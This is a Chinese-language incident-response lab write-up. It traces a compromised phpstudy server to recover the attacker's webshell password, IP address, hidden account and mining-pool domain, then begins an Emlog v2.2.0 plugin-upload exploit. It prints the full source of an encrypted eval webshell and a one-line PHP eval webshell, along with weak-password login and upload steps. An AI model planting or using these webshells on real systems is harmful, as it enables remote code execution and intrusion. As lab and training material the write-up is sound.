
:::info
前景需要：
小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：

1.攻击者的shell密码
2.攻击者的IP地址
3.攻击者的隐藏账户名称
4.攻击者挖矿程序的矿池域名

用户：
administrator
密码
Zgsf@admin.com
:::

打开虚拟机，发现是`phpstudy`

### 查杀webshell

用河马进行查杀`webshell`

![image-20240531174529772](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240531174529772.png)

```php
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

攻击者的shell密码是，rebeyond

### 查看apache的日志

搜索shell.php找到访问日志

![image-20240531174820861](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240531174820861.png)

攻击者的IP地址是`192.168.126.1`

### 分析windows日志

利用windows日志分析工具

发现用户`hack168$`远程登录成功

![image-20240531175125741](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240531175125741.png)

攻击者的隐藏账户名称是`hack168$`

### 分析挖矿程序

在`hack168$`用户的桌面发现挖矿程序

![image-20240531175350545](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240531175350545.png)



该图标为pyinstaller打包，使用pyinstxtractor进行反编译

```
https://github.com/extremecoders-re/pyinstxtractor
```

```cmd
python pyinstxtractor.py Kuang.exe
```

找到pyc文件

![image-20240531175630607](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240531175630607.png)

在线pyc反编译一下

```
https://tool.lu/pyc/
```

反编译后的源码

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.8

import multiprocessing
import requests

def cpu_intensive_task():
    
    try:
        requests.get('http://wakuang.zhigongshanfang.top', 10, **('timeout',))
    finally:
        continue
        continue

    continue

if __name__ == '__main__':
    cpu_count = multiprocessing.cpu_count()
    processes = (lambda .0: [ multiprocessing.Process(cpu_intensive_task, **('target',)) for _ in .0 ])(range(cpu_count))
    for process in processes:
        process.start()
    for process in processes:
        process.join()
```

攻击者挖矿程序的矿池域名是，wakuang.zhigongshanfang.top

### 通关

```
rebeyond
192.168.126.1
hack168$
wakuang.zhigongshanfang.top
```

### Emlog v2.2.0后台插件上传漏洞

利用phpstudy运行起来网站

弱密码`admin:123456`登录进后台

首先写一个文件`22.php`，内容`<?php eval($_POST[1]);?>`，进行压缩

![image-20240531181339661](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240531181339661.png)

上传之后访问`http://192.168.18.129/content/plugins/22/22.php`